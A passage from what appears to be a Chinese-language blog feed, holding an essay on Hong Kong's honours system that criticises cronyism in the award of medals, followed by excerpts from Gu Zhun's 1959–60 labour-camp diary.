<li><a href="https://web.archive.org/web/20031217162605/http://www.army.mil/usapa/epubs/pdf/r670_1.pdf" target="_blank" rel="noopener">美国陆军条例 Army Regulation 670–1 | Uniforms and Insignia | Wear and Appearance of Army Uniforms and Insignia</a></li>
<li><a href="https://web.archive.org/web/20031207111112/http://www.army.mil/usapa/epubs/pdf/r600_8_22.pdf" target="_blank" rel="noopener">美国陆军条例 Army Regulation 600–8–22 | Personnel—General Military Awards</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%9C%8B%E8%BB%8D%E4%BA%8B%E5%8B%B3%E7%8D%8E" target="_blank" rel="noopener">美国军事勋章</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%86%9B%E8%B7%A8%E5%86%9B%E7%A7%8D%E9%80%9A%E7%94%A8%E5%8B%8B%E5%A5%96" target="_blank" rel="noopener">维基百科：美国跨军种勋奖</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%9B%BD%E9%83%A8%E9%98%9F%E5%8B%A4%E5%8A%A1%E8%AF%86%E5%88%AB%E7%AB%A0" target="_blank" rel="noopener">维基百科：美军勤务识别章</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%A6%99%E6%B8%AF%E6%8E%88%E5%8B%B3%E5%8F%8A%E5%98%89%E7%8D%8E%E5%88%B6%E5%BA%A6" target="_blank" rel="noopener">香港授勋和嘉奖制度</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%A9%AC%E6%9D%A5%E8%A5%BF%E4%BA%9A%E8%81%94%E9%82%A6%E6%8E%88%E5%8B%8B%E5%8F%8A%E5%98%89%E5%A5%96%E5%88%B6%E5%BA%A6" target="_blank" rel="noopener">马来西亚（君主制）授勋和嘉奖制度</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B3%95%E5%9C%8B%E6%8E%88%E5%8B%B3%E5%8F%8A%E5%98%89%E7%8D%8E%E5%88%B6%E5%BA%A6" target="_blank" rel="noopener">法国授勋及嘉奖制度</a></li>
<li><a href="https://www.army.mil/article/184881?a" target="_blank" rel="noopener">New combat-related devices authorized for decorations(美军勋略符号)</a></li>
<li><a href="https://en.wikipedia.org/wiki/Carl_Brashear" target="_blank" rel="noopener">wiki:Carl Brashear</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title>太公分猪肉--香港特区授勋及嘉奖制度观察</title>
    <url>/2017/07/14/Medal-HK/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>香港勋衔文化源流</li>
<li>香港特区勋章体系</li>
<li>颁授和褫夺程序</li>
<li>现行嘉奖制度弊端</li>
</ul>
<a id="more"></a>
<h2 id="香港勋衔文化源流"><a href="#香港勋衔文化源流" class="headerlink" title="香港勋衔文化源流"></a>香港勋衔文化源流</h2><p>香港的勋衔文化可能源于港英时期的太平绅士（Justice of the Peace，JP，也译作治安法官）。它是一种源于英国，由政府委任民间人士担任维持社区安宁、防止非法刑罚及处理一些较简单的法律程序的职衔，多半是在适用英美法系的国家或是曾使用英美法系的地区。1843年，首任港督砵甸乍特选了44位社会人士成为治安委员，组成“英属香港治安委员会”。及后，“治安委员”扩大权利及易名为“太平绅士”。早期香港的太平绅士全属英国洋人，及至1878年12月14日伍廷芳获港督轩尼诗委任为首名华人太平绅士。自此，不少华人陆续被委任为太平绅士。立法局于1997年5月通过《太平绅士条例》（香港法例510章），从而确定了太平绅士在香港回归后的法律地位。</p>
<p>太平绅士分为两类，一类是官守成员：通常是副署长、副秘书长或助理署长以上政务官、十八区民政事务专员，官守成员从相关岗位离职后自动卸任。另一类非官守成员：由政务司长主持的遴选委员会提名推荐、之后由行政长官正式批准，无特定条件，一般要求热心社区公益或卓有贡献。太平绅士在香港民间声望颇高，早期可以参与审理轻微案件，也可以参与政府施政建议、巡视监狱、监督六合彩开奖等等。</p>
<h2 id="香港特区勋章体系"><a href="#香港特区勋章体系" class="headerlink" title="香港特区勋章体系"></a>香港特区勋章体系</h2><p>目前香港特别行政区的勋章体系大体分为N大类别：成就勋章（紫荆勋章系列和荣誉勋章）、烈士勋章（英勇勋章系列）、纪律部队奖章（警察、消防、海关及廉政公署奖章系列）和行政长官奖状（社区服务和公共服务系列）。</p>
<h3 id="一、成就勋章（紫荆勋章系列和荣誉勋章）"><a href="#一、成就勋章（紫荆勋章系列和荣誉勋章）" class="headerlink" title="一、成就勋章（紫荆勋章系列和荣誉勋章）"></a>一、成就勋章（紫荆勋章系列和荣誉勋章）</h3><ul>
<li>(a) 大紫荆勋章(GBM)<br>香港特别行政区授勋及嘉奖制度下的最高荣誉，表扬毕生为香港作出重大贡献的人士。</li>
<li>(b) 紫荆星章<br>颁授予长期致力服务公众而成绩斐然，或在所属行业有卓越成就的人士。三个等级勋章的甄选准则分别为：<br>(i) 金紫荆星章(GBS)<br>颁授予对社会有重大贡献或积极参与公共或志愿服务而得到极高评价的人士；<br>(ii) 银紫荆星章(SBS)是颁授予长期担任公共事务及志愿工作的领导人物；<br>(iii) 铜紫荆星章(BBS)是颁授予长期服务社会并有杰出表现的人士。与银紫荆星章比较，获授铜紫荆星章的人士所提供的服务比较局限于个别范畴或方式。</li>
<li>(c) 荣誉勋章(MH)<br>授勋制度下的基本勋衔，自1998年起开始颁授。用以表扬在 <strong>地区或某个范畴</strong> 长期为社区服务的人士。这勋章亦颁授予表现优异的 <strong>非首长级公务员</strong>。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Medal_HK_201707.png" alt></p>
<h3 id="二、烈士勋章（英勇勋章系列）"><a href="#二、烈士勋章（英勇勋章系列）" class="headerlink" title="二、烈士勋章（英勇勋章系列）"></a>二、烈士勋章（英勇勋章系列）</h3><p>颁授英勇勋章是为表扬某人士在个别事件中的英勇行为，分为三级：<br>(i) 金英勇勋章(MBG):见义勇为，无惧高度危险，奋不顾身，堪称英勇行为的最高典范。<br>(ii) 银英勇勋章(MBS):英勇非凡，堪称典范。<br>(iii) 铜英勇勋章(MBB):英勇过人，殊堪嘉许。</p>
<p>从实际颁授的情况来看，英勇勋章系列基本上属于烈士勋章。从1998年至2017年有28人颁授金英勇勋章，有22人确认属于死后追授（另有4人无资料、1名瘫痪为植物人、1名重伤后转文职），例如：“2000年9月22日公布11名入境处职员获嘉许，以表扬他们在8月2日入境事务大楼涉嫌纵火事件中表现英勇及尽忠职守。6人获颁英勇勋章，另外5人获颁行政长官公共服务奖状。事件中身受重伤，终告不治的梁锦光先生，获追授金英勇勋章。另外，于同年7月29日，为拯救友人而遇溺的卢俊河先生，亦获追授金英勇勋章。”</p>
<h3 id="三、纪律部队奖章（警察、消防、海关及廉政公署奖章系列）"><a href="#三、纪律部队奖章（警察、消防、海关及廉政公署奖章系列）" class="headerlink" title="三、纪律部队奖章（警察、消防、海关及廉政公署奖章系列）"></a>三、纪律部队奖章（警察、消防、海关及廉政公署奖章系列）</h3><ul>
<li>按照业务部门划分为七个系列、四种层次设置</li>
<li>颁授对象区分高级首长和中下层一般职级</li>
</ul>
<p>纪律部队和廉政公署 <strong>奖章</strong> 乃颁授予警务处、消防处、入境事务处、海关、惩教署和政府飞行服务队共六个纪律部队人员（上述统归保安局领导）及廉政公署人员，表扬他们致力服务社会、表现卓越。六个纪律部队和廉政公署人员可以颁授予 <strong>荣誉奖章</strong>，表扬他们忠于职守、能力过人、成就卓越，行为堪称典范，作出宝贵贡献。一般为 <strong>非首长级</strong> 人员。<strong>卓越奖章</strong> 颁授予六个纪律部队和廉政公署的 <strong>首长级(警司以上)</strong> 纪律部队人员，表扬他们致力服务社会及表现卓越。品格及行为良好，长期服务的各部队人员可以颁 <strong>授长期服务奖章加叙勋扣</strong>：第一加叙勋扣，服务满25年；第二加叙勋扣，服务满30年；第三加叙勋扣，服务满33年，算是老黄牛奖吧。</p>
<h3 id="四、行政长官奖状（社区服务和公共服务系列）"><a href="#四、行政长官奖状（社区服务和公共服务系列）" class="headerlink" title="四、行政长官奖状（社区服务和公共服务系列）"></a>四、行政长官奖状（社区服务和公共服务系列）</h3><p>行政长官社区服务奖状（Chief Executive’s Commendation for Community Service）</p>
<blockquote>
<p>(i) 颁授予在某次行为或某项工作中表现出色，或服务社区表现卓越，但稍稍未及颁授荣誉勋章要求的人士。</p>
</blockquote>
<p>行政长官公共服务奖状（Chief Executive’s Commendation for Government/Public Service）</p>
<blockquote>
<p>(ii) 颁授予在某次行动或某项工作中表现出色，或为某部门或机构服务，表现卓越，但稍稍未及颁授荣誉勋章要求的公务员或公职人员。</p>
</blockquote>
<p>主要特点：考察期较短、特殊性(例如参加某次重要卧底行动)，级别低于荣誉勋章。</p>
<h2 id="颁授和褫夺程序"><a href="#颁授和褫夺程序" class="headerlink" title="颁授和褫夺程序"></a>颁授和褫夺程序</h2><h3 id="颁授程序"><a href="#颁授程序" class="headerlink" title="颁授程序"></a>颁授程序</h3><p>部门首长提交提名书、遴选委员会审议推荐（纪律部队长期服务奖章除外）、行政长官决定、每年的7月1日由行政长官颁授勋章。</p>
<h4 id="组织机构：授勋及非官守太平绅士遴选委员会"><a href="#组织机构：授勋及非官守太平绅士遴选委员会" class="headerlink" title="组织机构：授勋及非官守太平绅士遴选委员会"></a>组织机构：授勋及非官守太平绅士遴选委员会</h4><p>授勋及非官守太平绅士遴选委员会（遴选委员会）负责初步甄选有关授勋及嘉奖人士的提名，以及有关委任非官守太平绅士的提名，向行政长官作出推荐。行政长官会亲自决定是否接纳推荐授勋和嘉奖的名单及委任非官守太平绅士的名单。为确保授勋及嘉奖的推荐标准一致、恰当和符合核准的颁授准则，由各局局长和部门首长提交的提名书，会经由遴选委员会审议。遴选委员会成员如下：<br>主席：政务司司长<br>非官守成员：行政会议成员、杰出的社会领袖<br>官守成员：财政司司长、民政事务局局长、公务员叙用委员会主席、行政长官办公室主任、中央政策组顾问<br>政府成立了两个小组委员会，协助遴选委员会工作。该两个小组委员会是：<br>非主要勋衔小组委员会（公务员），其成员包括︰<br>公务员事务局局长（主席）、公务员事务局常任秘书长、保安局副秘书长、一般职系处长、礼宾处处长（秘书）<br>非主要勋衔小组委员会（一般市民），其成员包括︰<br>行政署长（主席）、民政事务总署署长、社会福利署署长、工业贸易署署长、教育局副秘书长、礼宾处处长（秘书）</p>
<h3 id="褫夺程序"><a href="#褫夺程序" class="headerlink" title="褫夺程序"></a>褫夺程序</h3><p>褫夺程序：作出有损授勋及嘉奖制度的名声的行为（例如法院判决定罪而入狱一年或以上）、启动褫夺机制（礼宾处处长）、行政长官亲自批准褫夺、宪报公告。</p>
<blockquote>
<p>如获授勋／嘉奖人士的行为，会对其应否继续拥有该勋衔／奖状构成疑问，例如因被定罪而入狱一年或以上，不论是否获得缓刑，或作出有损授勋及嘉奖制度的名声的行为等，政府会考虑是否须褫夺其勋衔／奖状。</p>
</blockquote>
<p>礼宾处处长会启动褫夺机制，处理获悉的褫夺勋衔／奖状个案。每宗褫夺勋衔／奖状的个案须由行政长官亲自批准。政府会在《宪报》公告将获授勋或嘉奖人士的姓名从授勋名单中剔除，并收回其勋章／奖状。（《宪报》即《香港政府宪报》（1841年5月1日—1997年6月30日），香港主权移交后改称《香港特别行政区政府宪报》（1997年7月1日—至今）。通常于逢星期五出版，香港的所有条例及附属法例，都要在宪报刊登（通称“刊宪”）才生效。曾有诉讼因相关法律未有刊宪，疑犯因而脱罪。）</p>
<h2 id="现行嘉奖制度弊端"><a href="#现行嘉奖制度弊端" class="headerlink" title="现行嘉奖制度弊端"></a>现行嘉奖制度弊端</h2><p>在香港现代化进程中，曾经出现了一批奇才、大才，不仅事业成功，更兼人品德望，堪称香港社会的勋臣、乡贤。例如南洋商业银行创办人庄世平，一生与巨贾高官打交道，直到他离世时，都还居住于香港中银提供在跑马地荷塘道有52年楼龄的陈旧宿舍，四个儿子和两个女儿，没有一个在政界和商界出任要职，他的长子庄荣叙到退休前也不过是以租车送货、开巴士维生的普通香港人。又例如邵逸夫、田家炳、霍英东等，这些人里面很多都是出身草莽，事业有成之后于社会公益，或慈善、或教育、或体育，无不慷慨解囊，在海内外颇有贤名。但是，通过分析近年的授勋名单，作者发现香港现行授勋和嘉奖制度在执行过程中也存在诸多疑点、甚至严重弊端，略作解读，为读者镜鉴。</p>
<h4 id="1、“太公分猪肉”"><a href="#1、“太公分猪肉”" class="headerlink" title="1、“太公分猪肉”"></a>1、“太公分猪肉”</h4><p>舆论早有评论认为，勋章授勋名单明显有坐地分肥的味道，实际上已沦为“高官自己人俱乐部”。特区政府主要官员（行政长官、政务司长、财政司长、律政司长等）无一例外都被收于大紫荆勋章，甚至很大一部分是在任的时候颁授。遴选委员会本身由政务司长主持、主要政务官都是组成人员，从制度设计角度看就有严重缺陷，很容易给人以“既当运动员，又当裁判员”的想象，“你好我好大家好”的结果就必然导致遴选过程难言公允。更有诸多评论称授勋高官并无表现甚至失职，授勋是“太公分猪肉”（粤俚语，意人人有份）。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>颁授年份</th>
<th>姓名</th>
<th>行政长官</th>
</tr>
</thead>
<tbody>
<tr>
<td>2002年</td>
<td>曾荫权先生</td>
<td>第二任2005-2012    （时任政务司长）</td>
</tr>
<tr>
<td>2006年</td>
<td>董建华先生</td>
<td>第一任1997-2005    （时任全国政协副主席）</td>
</tr>
<tr>
<td>2011年</td>
<td>梁振英先生</td>
<td>第三任2012—2017 （时任行政会议召集人）</td>
</tr>
<tr>
<td>2016年</td>
<td>林郑月娥女士</td>
<td>第四任2017- （时任政务司长）</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>颁授年份</th>
<th>姓名</th>
<th>政务司长</th>
</tr>
</thead>
<tbody>
<tr>
<td>2002年</td>
<td>锺逸杰爵士</td>
<td>1985-1987    （港英政府）</td>
</tr>
<tr>
<td>1999年</td>
<td>陈方安生女士</td>
<td>1993-2001 （时为现任政务司长）</td>
</tr>
<tr>
<td>2002年</td>
<td>曾荫权先生</td>
<td>2001-2005（时为现任政务司长）</td>
</tr>
<tr>
<td>2007年</td>
<td>许仕仁</td>
<td>2005-2007 （时为现任政务司长，刑事入罪褫夺勋章）</td>
</tr>
<tr>
<td>2009年</td>
<td>唐英年先生</td>
<td>2007-2011（时为现任政务司长）</td>
</tr>
<tr>
<td>2012年</td>
<td>林瑞麟先生</td>
<td>2011-2012（时为现任政务司长）</td>
</tr>
<tr>
<td>2016年</td>
<td>林郑月娥女士</td>
<td>2012-2017（时为现任政务司长）</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>颁授年份</th>
<th>姓名</th>
<th>财政司长</th>
</tr>
</thead>
<tbody>
<tr>
<td>2002年</td>
<td>曾荫权先生</td>
<td>1995-2001（时为现任政务司长）</td>
</tr>
<tr>
<td>2009年</td>
<td>唐英年先生</td>
<td>2003-2007（时为现任政务司长）</td>
</tr>
<tr>
<td>2010年</td>
<td>曾俊华先生</td>
<td>2007-2017（时为现任财务司长）</td>
</tr>
<tr>
<td>2017年</td>
<td>陈茂波先生</td>
<td>署理财政司长2017（时为署理财务司长）</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>颁授年份</th>
<th>姓名</th>
<th>律政司长</th>
</tr>
</thead>
<tbody>
<tr>
<td>2002年</td>
<td>梁爱诗女士</td>
<td>1997-2005（时为现任律政司长）</td>
</tr>
<tr>
<td>2012年</td>
<td>黄仁龙先生</td>
<td>2005-2012（时为现任律政司长）</td>
</tr>
<tr>
<td>2017年</td>
<td>袁国强先生</td>
<td>2012-2017（时为现任律政司长）</td>
</tr>
</tbody>
</table>
</div>
<h4 id="2、满眼皆是金融地产，产业畸形前途堪忧"><a href="#2、满眼皆是金融地产，产业畸形前途堪忧" class="headerlink" title="2、满眼皆是金融地产，产业畸形前途堪忧"></a>2、满眼皆是金融地产，产业畸形前途堪忧</h4><div class="table-container">
<table>
<thead>
<tr>
<th>行业</th>
<th>数量</th>
<th>比例</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>金融工商</td>
<td>86人</td>
<td>90%+</td>
<td>集中在金融、银行等大型财团，包括家族继承人、董事等高管</td>
</tr>
<tr>
<td>政府</td>
<td>15人</td>
<td>15%</td>
<td>特区政府主要官员（特首、三司一会）</td>
</tr>
<tr>
<td>司法界</td>
<td>8人</td>
<td>8%</td>
<td>大部分终审法院法官、大律师公会主席</td>
</tr>
<tr>
<td>医学界</td>
<td>2人</td>
<td>2%</td>
<td>历任香港医学会会长</td>
</tr>
<tr>
<td>科学界</td>
<td>3人</td>
<td>3%</td>
<td>光通讯科学（诺贝尔物理学奖）1人、加州伯克利大学前任校长1名（热物理学）</td>
</tr>
<tr>
<td>文艺界</td>
<td>2人</td>
<td>2%</td>
<td>包括金庸在内，都与大陆高层政治圈有莫名的联系</td>
</tr>
</tbody>
</table>
</div>
<p>注：数据跨度1997-2017年共有95名大紫荆勋章获得者，上述分类只是粗略统计，其中部分获得者涉及多个领域，详细情况请自行检索。</p>
<p>虽然仅凭授勋名单及粗略的统计并不能说明所有问题，但是一叶知秋：近年以来香港治理当局不仅在经济上过于强调金融地产的绝对作用，而且在社会政策方面（包括嘉奖制度）也有明显的倾斜，既当高官又发大才兼上八卦周刊的案例甚多。产业空心化、优质人才流失，在发展质量和持续力方面出的问题，实际上在经济地位上也反应出来了：香港早已不复当年的亚洲四小龙翘楚的风光，GDP目前仅为台湾之1/3，韩国之1/5，同样也被新加坡反超。让我们来看一组香港贸易发展局提供的最新经济数字（2017年7月）：<br>香港经济继2016年实质 <strong>增长2%</strong>后，于2017年第一季按年增长4.3%。预测2017年整体经济增长为2-3%。<br>零售业销货額，以名义计，继在 <strong>2016年下跌8.1%</strong> 后，再于2017年1-5月按年 <strong>下跌0.7%</strong> 。<br>劳工市场偏紧。截至2017年5月为止的3个月的经季节性调整 <strong>失业率为3.2%</strong>，2016年则为3.4%。<br>消费物价继2016年上升2.4%后，于2017年1-5月上升1.1%。通胀的上行风险在短期内应该有限。<br>香港货物出口继2016年轻微下跌0.5%后，于2017年1-5月按年上升8.2%。2017年全年，香港出口预期增长5%。</p>
<h4 id="3、丑闻缠身、勋贤不“贤”；公器滥用，民望缩水"><a href="#3、丑闻缠身、勋贤不“贤”；公器滥用，民望缩水" class="headerlink" title="3、丑闻缠身、勋贤不“贤”；公器滥用，民望缩水"></a>3、丑闻缠身、勋贤不“贤”；公器滥用，民望缩水</h4><p>此类案例甚多，真是五花八门、千奇百怪，在此仅简单罗列几项：</p>
<ul>
<li>李国宝（2007年颁授）婚外情，传媒给予李国宝“宝Baby”的称号</li>
<li>唐英年（2009年颁授）婚外情，豪宅违建</li>
<li>冯国经：2008年金融海啸打击香港经济，冯获香港特区政府委任为“经济机遇委员会”成员，评估金融海啸对香港经济的影响及商讨应对方法。不久，冯旗下公司利丰集团却带头裁员，广受公众批评。</li>
<li>许仕仁：任政务司司长后，与商界藕断丝连，最终卷入刑事指控，在2014年于香港高等法院被裁定公职人员行为失当、串谋向公职人员提供利益等5项罪名成立，判禁7年半。褫夺勋章。</li>
<li>任志刚：金管局总裁，被指“山寨王”、严重失职；公众印象奢靡，例如88楼办公室可使用私人专用电梯出入，被认为是动用纳税人的血汗钱为自己建造尊贵享受。<br>……….</li>
</ul>
<p>上述诸多案例，很多可能是八卦，也有可能是媒体报道偏差。法无禁止即自由，但这是在私法领域而言；在公法领域则强调限制权力、“法无授权即禁止”。诸多案例反映出高官们为政庸懦、以公肥私之风大盛，小辫子被公众关切之后也鲜有人能站出来担当，如果是在韩国，很多人就该辞职或者去跳楼。治理当局如果不能在道德上自律——“不能正其身，如正人何？”。</p>
<ul>
<li>从历年的授勋情况分析，大紫荆勋章“通货膨胀”的趋势明显<br>香港调查研究中心研究员吴文涛曾发表文章表示，董建华政府对颁勋较为保守而不滥颁，对于最高荣誉的大紫荆勋章，曾因没有合适人选，在2003及2004年悬空不颁，除了向杨光（传统左派工联会）于2000年授勋引起议论外，并未有太多批评。而曾荫权授勋，令人觉得惟有做大商人，高官，亲近权贵，就是成功人士。自梁振英上任后，大紫荆勋章沦为酬谢支持者的报答更趋明显，例如2017年提名的大紫荆勋章获得者人数众多（与1997年持平），全部都是梁行政团队成员、竞选办公室主任、关系密切的地产商，赶在下台之前授勋，难免有“有权不用、过期作废”之观感。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>this nation, under God, shall have a new birth of freedom, and that government of the people, by the people, for the people, shall not perish from the earth. —— Abraham Lincoln</p>
</blockquote>
<p>香港现行的授勋和嘉奖制度，受英国传统的爵士制度、170多年的太平绅士制度影响很深，经过特区政府成立之后的一些调整，总体上已经建立了比较统一、完备的制度体系结构。从1997年以来的实际授勋情况、特别是大紫荆勋衔的颁授情况来看，早期还是能够坚持谨慎使用、兼容并蓄的原则，但是后来有私相授受、“通货膨胀”的嫌疑。在制度价值判断方面，中国传统文化讲究“仁者爱人”，现代政治文明的首要之义在“天赋人权、人人平等”，正如孟子曰：“君子以仁存心，以礼存心。仁者爱人，有礼者敬人。爱人者人恒爱之，敬人者人恒敬之”。一个社会综合体是否真的尊重人、礼敬人，很容易通过授勋及嘉奖制度这一特殊窗口展现出来的，这一制度的设计不仅关乎价值导向，同样也是关乎政权的合法性的关键命题。滥用名器、“赢家通吃”，不仅扭曲了设立勋章制度的意义，而且容易加剧社会阶层矛盾，埋下繁荣、稳定的不确定风险。</p>
<h2 id="扩展阅读：美军授勋和嘉奖制度观察"><a href="#扩展阅读：美军授勋和嘉奖制度观察" class="headerlink" title="扩展阅读：美军授勋和嘉奖制度观察"></a>扩展阅读：<a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">美军授勋和嘉奖制度观察</a></h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.protocol.gov.hk/chi/honours/index.html" target="_blank" rel="noopener">香港特区政府总部礼宾处：授勋及嘉奖</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%A6%99%E6%B8%AF%E5%A4%AA%E5%B9%B3%E7%B4%B3%E5%A3%AB%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">香港太平绅士列表</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%A6%99%E6%B8%AF2017%E5%B9%B4%E5%BA%A6%E6%8E%88%E5%8B%B3%E5%8F%8A%E5%98%89%E7%8D%8E%E5%90%8D%E5%96%AE" target="_blank" rel="noopener">香港2017年度授勋及嘉奖名单</a></li>
<li><a href="http://hong-kong-economy-research.hktdc.com/business-news/article/%E5%B8%82%E5%A0%B4%E7%92%B0%E5%A2%83/%E9%A6%99%E6%B8%AF%E7%B6%93%E8%B2%BF%E6%A6%82%E6%B3%81/etihk/tc/1/1X000000/1X09OVUL.htm" target="_blank" rel="noopener">香港贸易发展局：贸易概况2017年7月</a></li>
</ul>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title>豪侠列传|顾准</title>
    <url>/2017/04/20/MrGuZhun/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>《顾准日记》</li>
</ul>
<blockquote>
<p>说明末农民战争和清军入关阻止了资本主义那一点“芽”成长起来，完全错了。清政府基本上还是恢复Ancient Regime（旧制度），所以，可以有十全武功，却永远也不会有资本主义。。。东方专制主义到明代已经穷途末路，什么道路，在儒法道佛杂糅的理教控制下是摸索不出来的。只有大炮才轰得开这个铁幕！（梁方仲论明中叶以后的经济大势）</p>
</blockquote>
<a id="more"></a>
<h1 id="《顾准日记》"><a href="#《顾准日记》" class="headerlink" title="《顾准日记》"></a>《顾准日记》</h1><h2 id="商城日记（1959-10～1960-1）"><a href="#商城日记（1959-10～1960-1）" class="headerlink" title="商城日记（1959.10～1960.1）"></a>商城日记（1959.10～1960.1）</h2><h4 id="十一月二十二日-晨三时半"><a href="#十一月二十二日-晨三时半" class="headerlink" title="十一月二十二日 晨三时半"></a>十一月二十二日 晨三时半</h4><p><strong>红薯叶与拉肚子</strong><br>第一天吃红薯叶，三顿，每饭一碗。晚间菜稀饭，加大碗红薯叶，翌晨拉肚子。20日吃红薯叶，量减半。</p>
<p>早饭时张哲华问，我烤了红薯，为何不取，其实这时柳学冠那个。<br>我既与柳是同犯，也就不再检举他。张哲华质问我，我本想和盘托出，想想不好。看昨天情形，不会再有事追究，也就罢了。其实，只要有机会，无人不吃。下棚生红薯，上棚萝卜。我站岗时也吃萝卜花生。柳学冠烤的那个，竟未敢取。今天谢德征让我吃了。（p23）</p>
<h4 id="十一月二十三日-上午九时半"><a href="#十一月二十三日-上午九时半" class="headerlink" title="十一月二十三日 上午九时半"></a>十一月二十三日 上午九时半</h4><p><strong>暴露思想</strong><br>董要求暴露思想。他嫌我暴露不够，大训一顿。<br>此次整风特点，大约是没有右倾思想就不能过关。<br>从今天开始，想想如何暴露法。问题恐要围绕人道主义，蔓延及于先进吃亏论等等上去。三五日内编出一套提纲。（p24）</p>
<p><strong>精神折磨的痛烈之感</strong><br>下午栽菜上粪时，思及生活象 <strong>泥污</strong> ，而精神上今天这个人、明天那个人来训一通，卑躬屈节，笑魇迎人已达极度，困苦嫌恶之感，痛烈之至。</p>
<h4 id="十一月二十九日-晚九时半"><a href="#十一月二十九日-晚九时半" class="headerlink" title="十一月二十九日 晚九时半"></a>十一月二十九日 晚九时半</h4><p>今年打下粮食，隐藏私分是普遍的，搜粮与停止供应也是不乏其例的。然而隐藏私分必定为量不多，中秋过后，吃饭问题已经紧张，征起粮食，明年供应，叫做细水长流，慢性饥饿必较今年更甚。</p>
<p>死人，已知柳学冠之弟，杨文华的女儿，刘方惠的父亲。其他所听说的还不少。商城全县平均土地，每人不过七八分，用这个方法解决人口问题倒也好。(p26)</p>
<p>杨自诩全无问题，样样都通。此人 <strong>告密</strong> 别人，鹦鹉学舌式地积极，奉承领导。论过去，是一个旧社会极世故地人。弄清本质之后，觉得可厌。（p27）</p>
<h4 id="十二月一日-下午三时"><a href="#十二月一日-下午三时" class="headerlink" title="十二月一日 下午三时"></a>十二月一日 下午三时</h4><p>今天上午翻地栽菜拔菜秧。杨文华很严厉，我在翻地速度与准时上二方面并未落后。<br>上午阴小雨，下午浇了一挑粪水（黄豆地），就在下棚“学习”，读报，我在抽空子写笔记。（p31）</p>
<h4 id="十二月一日-下午九时"><a href="#十二月一日-下午九时" class="headerlink" title="十二月一日 下午九时"></a>十二月一日 下午九时</h4><p><strong>今晚至少有二处斗争会</strong><br>雨雪中坚持工地工程，晚上各组发柴火烤湿衣服。<br>菜园正在斗争柳学冠，因为他喝中药喝得不好，把药倒了。</p>
<h4 id="十二月二日"><a href="#十二月二日" class="headerlink" title="十二月二日"></a>十二月二日</h4><p><strong>我的胡萝卜挨偷了</strong><br>被偷至少十几个。昨下午，一个妇女当着下棚许多人，偷胡萝卜。当群众饥饿的时候，如何看得住？</p>
<h4 id="十二月八日-晚六时半"><a href="#十二月八日-晚六时半" class="headerlink" title="十二月八日 晚六时半"></a>十二月八日 晚六时半</h4><p>李宝仁曾写信给人家，说劳动队成绩是微小的，沈万山深恨此事，所以不断找她岔子。昨晚宣布李是四类，说八类也可以。他说，李宝仁说我们理论不高，我还不是要斗争你就斗你啦！如今的党性都属此类。莫看沈是粗人，他是深得毛之三昧的。毛对费孝通不也是这样说的吗？<br><strong>我得到了沈的表扬</strong> 沈说我“接上头”了。这其实是笑魇迎人政策的结果。我近来每见沈必招呼，他不瞅不睬我也招呼，<strong>这就合乎他的心意了</strong>。（p39）</p>
<h4 id="十二月十七日-上午九时半"><a href="#十二月十七日-上午九时半" class="headerlink" title="十二月十七日 上午九时半"></a>十二月十七日 上午九时半</h4><p><strong>吃饭制度的三变</strong><br>吃饭制度，如是已经三变。第一种制度，打在饭桶里，大家在桶里装碗。那好紧张，真是抢饭那。我吃干饭也不免少嚼急咽，还不免“干活一个不如一个，吃饭一个比一个厉害”的批评。第一种制度，在去年还行得通。粮食多，吃不饱可到工地食堂与小贩那里买鸡蛋、包子、干饭、馍馍之类吃，有人吃，也有人买。<br>第二种制度，那是十一前夕实行的，各人一盆，实行分饭。紧张程度减轻了，可是分饭时还不免紧张得很。<br>第三种，连分饭都不要了，定量下盆，各人直接从蒸笼里端。<br>贫乏出办法，那倒是真的。可是以后再没有剩饭了，早起烧锅，喝碗米汤也办不到了。(p48)</p>
<h4 id="1960-一月十日"><a href="#1960-一月十日" class="headerlink" title="1960 一月十日"></a>1960 一月十日</h4><p><strong>RELIGION</strong><br>社会责任感是一种崇高的感情，这时区别家雀与海燕的东西。宗教情绪是卑微的，它引导人们趋向愚昧。（p105）<br>从昨天与一连几天的高潮来看，青年人要避免这种宗教情绪的影响是不可能的。我为什么要强制人家做一件在他无力抵抗的事呢？</p>
